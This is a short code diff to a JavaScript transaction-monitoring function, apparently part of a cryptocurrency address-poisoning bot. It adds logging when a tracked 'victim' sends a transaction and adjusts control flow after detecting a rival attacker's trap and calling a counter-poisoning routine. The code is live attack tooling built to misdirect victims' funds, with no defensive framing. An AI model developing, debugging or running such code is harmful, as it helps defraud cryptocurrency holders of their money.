@@ -996,6 +996,13 @@ function checkTransaction(tx, txLogs = []) {
   const now = Date.now();
 
 
+  // 🆕 DIAGNOSTIC: Log when we see a transaction from one of our victims
+  if (victims.has(from)) {
+    const entry = victims.get(from);
+    logger.info(`[DEBUG] 👀 Victim transaction detected: ${from} → ${to} (counterparty: ${entry.counterparty})`);
+  }
+
+
   // Deduplicate
   if (processedTxHashes.has(hash)) return;
   processedTxHashes.set(hash, now);
@@ -1074,7 +1081,7 @@ function checkTransaction(tx, txLogs = []) {
         logger.info(`[competitive] Other attacker's trap: ${suspectAddress}`);
         logger.info(`[competitive] Mirror contract used: ${log.contract}`);
         counterPoison(victimAddr, entry);
-        return;
+        break;
       }
     }
   }
